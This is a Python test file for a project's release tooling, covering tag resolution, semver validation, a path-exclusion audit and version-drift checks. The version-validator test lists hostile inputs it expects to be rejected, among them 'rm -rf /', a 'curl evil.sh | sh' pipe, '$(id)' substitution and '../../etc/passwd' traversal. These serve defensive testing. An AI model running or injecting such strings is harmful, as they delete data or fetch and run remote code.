#!/usr/bin/env python3
"""Release automation tests: annotated-tag commit resolution, semver policy,
the RELEASE.md exclusion audit, and the package.json version authority.

Pure stdlib + real git subprocesses. No backend imports, no mocks:

    python3 backend/scripts/test_release_policy.py
"""
from __future__ import annotations

import contextlib
import importlib.util
import io
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent.parent
SCRIPTS_DIR = REPO_ROOT / "scripts"

# Overridable so a throwaway pre-fix copy of release.py can be exercised by the
# same regression assertions (see _load_release / test_annotated_tag_*).
RELEASE_MODULE_PATH = SCRIPTS_DIR / "release.py"


def _load_module(path: Path, name: str):
    spec = importlib.util.spec_from_file_location(name, path)
    module = importlib.util.module_from_spec(spec)
    sys.path.insert(0, str(path.parent))
    try:
        spec.loader.exec_module(module)
    finally:
        sys.path.remove(str(path.parent))
    return module


def _load_release():
    """Load release.py fresh so REPO_ROOT can be redirected per fixture repo."""
    return _load_module(Path(RELEASE_MODULE_PATH), "release_under_test")


policy = _load_module(SCRIPTS_DIR / "release_policy.py", "release_policy_under_test")


# --------------------------------------------------------------------------- #
# git fixture helpers
# --------------------------------------------------------------------------- #

def _git_env(home: Path) -> dict:
    env = dict(os.environ)
    env.update(
        {
            "HOME": str(home),
            "GIT_CONFIG_GLOBAL": os.devnull,
            "GIT_CONFIG_SYSTEM": os.devnull,
            "GIT_CONFIG_NOSYSTEM": "1",
            "GIT_AUTHOR_NAME": "Release Test",
            "GIT_AUTHOR_EMAIL": "release-test@example.invalid",
            "GIT_COMMITTER_NAME": "Release Test",
            "GIT_COMMITTER_EMAIL": "release-test@example.invalid",
            "GIT_AUTHOR_DATE": "2020-01-01T00:00:00+00:00",
            "GIT_COMMITTER_DATE": "2020-01-01T00:00:00+00:00",
        }
    )
    return env


def _git(repo: Path, *args: str) -> str:
    proc = subprocess.run(
        ["git", "-C", str(repo), "-c", "commit.gpgsign=false", "-c", "tag.gpgsign=false", *args],
        capture_output=True,
        text=True,
        env=_git_env(repo),
        check=False,
    )
    if proc.returncode != 0:
        raise AssertionError(
            f"git {' '.join(args)} failed in {repo}: {(proc.stderr or proc.stdout).strip()}"
        )
    return proc.stdout


def _make_fixture_repo(root: Path, version: str, tag: str) -> Path:
    """Real repo, real commit, real ANNOTATED tag (lightweight would not expose
    the tag-object-vs-commit bug)."""
    repo = root / "repo"
    repo.mkdir()
    _git(repo, "init", "--initial-branch=main", ".")
    (repo / "package.json").write_text(
        json.dumps({"name": "better-agent", "version": version}, indent=2) + "\n",
        encoding="utf-8",
    )
    (repo / "README.md").write_text("fixture\n", encoding="utf-8")
    _git(repo, "add", "package.json", "README.md")
    _git(repo, "commit", "-m", "fixture commit")
    _git(repo, "tag", "-a", tag, "-m", f"Better Agent {tag}")
    return repo


def _run_release(repo: Path, argv: list[str]) -> tuple[int, str, str]:
    """Drive real release.py main() with REPO_ROOT redirected at the fixture."""
    release = _load_release()
    release.REPO_ROOT = repo
    out, err = io.StringIO(), io.StringIO()
    with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
        code = release.main(argv)
    return code, out.getvalue(), err.getvalue()


# --------------------------------------------------------------------------- #
# 1. REGRESSION: annotated tag must resolve to the COMMIT sha
# --------------------------------------------------------------------------- #

def test_annotated_tag_resolves_to_commit_sha() -> None:
    version, tag = "0.2.0", "v0.2.0"
    with tempfile.TemporaryDirectory(prefix="ba-release-test-") as tmp:
        repo = _make_fixture_repo(Path(tmp), version, tag)

        commit_sha = _git(repo, "rev-parse", f"{tag}^{{commit}}").strip()
        tag_object_sha = _git(repo, "rev-parse", tag).strip()
        # Guard against a vacuous test: with an annotated tag these MUST differ.
        assert tag_object_sha != commit_sha, (
            "fixture is not exercising an annotated tag: rev-parse <tag> == "
            f"rev-parse <tag>^{{commit}} == {commit_sha}"
        )
        assert _git(repo, "cat-file", "-t", tag_object_sha).strip() == "tag"
        assert _git(repo, "cat-file", "-t", commit_sha).strip() == "commit"

        code, out, err = _run_release(repo, [version])
        assert code == 0, f"release dry run failed: {err or out}"

        matches = re.findall(r"Source commit: `([0-9a-f]{40})`", out)
        assert matches, f"release notes did not report a source commit:\n{out}"
        for reported in matches:
            assert reported != tag_object_sha, (
                "release notes report the annotated TAG OBJECT sha as the source "
                f"commit ({reported})"
            )
            assert reported == commit_sha, (
                f"expected commit {commit_sha}, notes reported {reported}"
            )
        # The short form printed by the audit line must peel too.
        assert f"({commit_sha[:12]})" in out, out
        assert tag_object_sha[:12] not in out, out


# --------------------------------------------------------------------------- #
# 2. validate_version — fail closed
# --------------------------------------------------------------------------- #

def test_validate_version() -> None:
    for good in ("0.0.0", "0.2.0", "1.2.3", "10.20.30", "0.2.0-rc.1", "1.0.0-alpha.1+build.7"):
        assert policy.validate_version(good) == good

    bad = [
        # A single TRAILING newline must be rejected: `$` matches before it,
        # so SEMVER_RE anchors with `\Z` to keep the validator fail-closed.
        "1.2.3\n",
        "v1.2.3",
        "1.2",
        "1",
        "1.2.03",
        "01.2.3",
        "1.2.3.4",
        "",
        " ",
        " 1.2.3",
        "1.2.3 ",
        "1.2.3\r\n",
        "1.2.3\n; rm -rf /",
        "1.2.3\nv9.9.9",
        "1.2.3;rm -rf /",
        "1.2.3 && curl evil.sh | sh",
        "../../etc/passwd",
        "0.2.0/../../../tmp",
        "$(id)",
        "`id`",
        "1.2.3$IFS",
        "--upload-pack=touch",
        "1.2.3" + "0" * 80,
        "1.2.3-",
        "1.2.3-rc..1",
    ]
    for value in bad:
        try:
            policy.validate_version(value)
        except policy.PolicyError:
            continue
        raise AssertionError(f"validate_version accepted {value!r}")

    for wrong_type in (None, 1, 1.0, ["1.2.3"], {"version": "1.2.3"}):
        try:
            policy.validate_version(wrong_type)  # type: ignore[arg-type]
        except policy.PolicyError:
            continue
        raise AssertionError(f"validate_version accepted {wrong_type!r}")

    assert policy.tag_for_version("0.2.0") == "v0.2.0"
    assert policy.source_archive_name("0.2.0") == "better-agent-0.2.0.tar.gz"
    assert policy.archive_prefix("0.2.0") == "better-agent-0.2.0/"
    for derived in (policy.tag_for_version, policy.source_archive_name, policy.archive_prefix):
        try:
            derived("v0.2.0")
        except policy.PolicyError:
            continue
        raise AssertionError(f"{derived.__name__} accepted a non-semver version")


# --------------------------------------------------------------------------- #
# 3. audit_paths — RELEASE.md exclusions vs. legitimate tracked exceptions
# --------------------------------------------------------------------------- #

def test_audit_paths_flags_exclusions() -> None:
    must_flag = [
        "better-agent-private/README.md",
        "nested/better-agent-private/x.py",
        ".env",
        "docker/.env",
        "backend/.env.local",
        "backend/.venv/pyvenv.cfg",
        "backend/.venvs/active/bin/python",
        "venv/bin/activate",
        "lib/python3.12/site-packages/foo.py",
        "frontend/node_modules/react/index.js",
        "backend/__pycache__/main.cpython-312.pyc",
        ".better-claude/sessions/x.json",
        ".better-agent/config.json",
        "dist/BetterAgent.dmg",
        "dist/BetterAgent.pkg",
        "dist/app-release.apk",
        "dist/app-release.aab",
        "dist/BetterAgentSetup.exe",
        "dist/BetterAgent.msi",
        "dist/BetterAgent.AppImage",
        "dist/source.tar.gz",
        "dist/source.tgz",
        "dist/source.zip",
        "dist/source.tar.bz2",
        "dist/source.tar.xz",
        "/etc/passwd",
        "../outside/file.py",
        "a/../../b",
        "frontend\\node_modules\\pkg\\index.js",
    ]
    for path in must_flag:
        violations = policy.audit_paths([path])
        assert violations, f"audit_paths did not flag {path!r}"

    allowed = [
        "docker/.env.example",
        "docker/.env.sample",
        "docker/.env.template",
        "vendor/api-surface-sync/0.2.1/api_surface_sync-0.2.1-py3-none-any.whl",
        "vendor/other/pkg-1.0-py3-none-any.whl",
        "backend/main.py",
        "package.json",
        "scripts/release.py",
        "RELEASE.md",
        "docs/venv-notes.md",
        "frontend/src/components/Env.tsx",
        "",
        "   ",
    ]
    assert policy.audit_paths(allowed) == [], policy.audit_paths(allowed)

    # Multiple violations are all reported, one line each, naming the path.
    mixed = ["backend/main.py", ".env", "frontend/node_modules/a.js"]
    violations = policy.audit_paths(mixed)
    assert len(violations) == 2, violations
    assert any(".env" in v for v in violations)
    assert any("node_modules" in v for v in violations)


def test_audit_paths_accepts_the_real_tracked_tree() -> None:
    """The real repo's tracked file list must satisfy its own release policy."""
    listing = subprocess.run(
        ["git", "-C", str(REPO_ROOT), "ls-tree", "-r", "--name-only", "HEAD"],
        capture_output=True,
        text=True,
        check=True,
    ).stdout.splitlines()
    assert listing, "git ls-tree returned no tracked files"
    assert any(p == "docker/.env.example" for p in listing), "fixture assumption changed"
    assert any(p.endswith(".whl") for p in listing), "fixture assumption changed"
    violations = policy.audit_paths(listing)
    assert violations == [], "tracked tree violates release policy:\n  - " + "\n  - ".join(
        violations[:20]
    )


# --------------------------------------------------------------------------- #
# 4. package.json is the version authority; drift is enforced
# --------------------------------------------------------------------------- #

def test_read_repo_version_and_drift_enforcement() -> None:
    with tempfile.TemporaryDirectory(prefix="ba-release-test-") as tmp:
        root = Path(tmp)
        repo = _make_fixture_repo(root, "0.2.0", "v0.2.0")
        assert policy.read_repo_version(repo) == "0.2.0"

        # Requested version disagreeing with package.json must abort.
        code, out, err = _run_release(repo, ["0.3.0"])
        assert code == 1, out
        assert "version drift" in (err + out), err + out
        assert "0.2.0" in (err + out) and "0.3.0" in (err + out)

        # ... unless drift is explicitly allowed.
        code, out, err = _run_release(repo, ["0.3.0", "--allow-version-drift"])
        assert code == 0, err + out
        assert "version drift" not in (err + out)

        # --set-version writes only package.json, preserving key order, and
        # rejects non-semver input.
        code, out, err = _run_release(repo, ["0.4.0", "--set-version"])
        assert code == 0, err + out
        assert policy.read_repo_version(repo) == "0.4.0"
        assert list(json.loads((repo / "package.json").read_text())) == ["name", "version"]
        assert _git(repo, "status", "--porcelain").strip(), "expected an uncommitted change"
        code, out, err = _run_release(repo, ["v0.5.0", "--set-version"])
        assert code == 1 and policy.read_repo_version(repo) == "0.4.0"

        # A dirty tree is refused for a real release path.
        code, out, err = _run_release(repo, ["0.4.0"])
        assert code == 1 and "not clean" in (err + out), err + out

        # Malformed / missing package.json fails closed.
        bad = root / "bad"
        bad.mkdir()
        for content in ("not json", "[]", "{}", '{"version": 1}'):
            (bad / "package.json").write_text(content, encoding="utf-8")
            try:
                policy.read_repo_version(bad)
            except policy.PolicyError:
                continue
            raise AssertionError(f"read_repo_version accepted {content!r}")
        missing = root / "missing"
        missing.mkdir()
        try:
            policy.read_repo_version(missing)
        except policy.PolicyError:
            pass
        else:
            raise AssertionError("read_repo_version accepted a missing package.json")


TESTS = [
    test_annotated_tag_resolves_to_commit_sha,
    test_validate_version,
    test_audit_paths_flags_exclusions,
    test_audit_paths_accepts_the_real_tracked_tree,
    test_read_repo_version_and_drift_enforcement,
]


def main() -> int:
    if shutil.which("git") is None:
        print("test_release_policy: git not found on PATH", file=sys.stderr)
        return 1
    for test in TESTS:
        test()
        print(f"  ok  {test.__name__}")
    print("test_release_policy: OK")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
